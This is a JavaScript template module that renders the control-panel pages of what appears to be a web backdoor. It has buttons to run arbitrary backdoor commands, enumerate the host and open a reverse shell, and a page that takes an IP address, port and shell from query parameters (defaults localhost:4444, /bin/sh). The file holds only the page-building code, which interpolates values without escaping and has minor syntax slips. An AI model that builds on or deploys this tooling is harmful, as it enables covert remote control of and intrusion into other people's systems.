`use strict`;

/********************
 * Template - Build HTML
 *******************/

/**
 * CSS Reference
 */
const CSS = `<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"></link>`;

/**
 * Links CSS
 * @returns {String}
 */
const linkCSS = () => CSS;

/**
 * Builds a Link button
 * @param {String} originURL 
 * @param {String} endpoint 
 * @param {String} text 
 * @returns {String}
 */
const buildLink = (originURL, endpoint, text) => `
    <div class="col-sm">
        <a class="btn btn-info" href="${ originURL }/${ endpoint }">${ text }</a>
    </div></br>`;

/**
 * Build Home Page
 * @param {String} originURL 
 * @returns {String}
 */
const buildHomePage = (originURL) => `${ linkCSS() }
    <div>
        ${ buildLink(originURL, `run`, `Run Backdoor Command`) }
        ${ buildLink(originURL, `summary`, `Run Enumeration Summary`) }
        ${ buildLink(originURL, `reverse`, `Run Reverse Shell`) }
    </div>`;

/**
 * Build Reverse Page
 * @param {String} ip 
 * @param {Number} port 
 * @param {String} shell 
 * @returns {String}
 */
const buildReversePage = (ip, port, shell) => `
    <h2>
        Using Query Params ?ip=${ ip }&port=${ port }&shell=${ shell } to create a reverse shell on ${ ip || `localhost` }:${ port || 4444 } using '${ shell || `/bin/sh` }'}
    </h2>`;

/**
 * Builds Summary Page
 * @param {String} sections 
 * @param {String} commands 
 * @returns {String}
 */
const buildSummaryPage = (sections, commands) => `${ linkCSS() }
    <div>
      <table class="table" style="table-layout: fixed; word-wrap: break-word;">
        <thead>
          <tr>
            ${ sections }
          </tr>
        </thead>
        <tbody>
          ${ commands }
        </tbody>
      </table>
    </div>`;

/**
 * Build Run Page
 * @param {String} command 
 * @returns {String}
 */
const buildRunPage = (command) => `
    <div>
        ${ command }
    </div>`;

module.exports = {
  buildHomePage,
  buildReversePage,
  buildSummaryPage,
  buildRunPage
};
